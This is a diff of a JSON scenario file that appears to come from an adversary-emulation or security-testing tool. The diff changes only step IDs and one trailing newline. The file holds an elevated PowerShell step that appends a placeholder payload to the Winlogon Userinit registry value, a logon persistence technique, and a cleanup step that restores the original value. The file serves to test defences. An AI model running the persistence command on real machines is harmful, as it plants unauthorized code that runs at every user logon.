@@ -7,16 +7,16 @@
   ],
   "steps": [
     {
-      "id": "0540d112-a151-49d2-8f0b-e1f25c2a1da0",
+      "id": "ec352f12-c091-48d6-9b6b-29d8a837daa1",
       "type": "execute-command",
       "data": {
-        "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"\n",
+        "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\");\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit-backup\" -Value \"$oldvalue\";\n$newvalue = $oldvalue + \" #{payload}\";\nSet-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$newvalue\"",
         "command_type": "powershell"
       },
       "elevation_required": true
     },
     {
-      "id": "46401237-cc63-4e6c-a6ec-43205d7a253d",
+      "id": "877d76d0-a3d3-456b-9082-6494449b759b",
       "type": "execute-command",
       "data": {
         "command": "$oldvalue = $(Get-ItemPropertyValue -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup');\nSet-ItemProperty -Path \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name \"Userinit\" -Value \"$oldvalue\";\nRemove-ItemProperty -Path  \"HKLM:\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" -Name 'Userinit-backup'",
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "0540d112-a151-49d2-8f0b-e1f25c2a1da0",
+      "s": "ec352f12-c091-48d6-9b6b-29d8a837daa1",
       "p": "on-success",
-      "o": "46401237-cc63-4e6c-a6ec-43205d7a253d"
+      "o": "877d76d0-a3d3-456b-9082-6494449b759b"
     },
     {
-      "s": "0540d112-a151-49d2-8f0b-e1f25c2a1da0",
+      "s": "ec352f12-c091-48d6-9b6b-29d8a837daa1",
       "p": "on-failure",
-      "o": "46401237-cc63-4e6c-a6ec-43205d7a253d"
+      "o": "877d76d0-a3d3-456b-9082-6494449b759b"
     }
   ],
   "tags": [
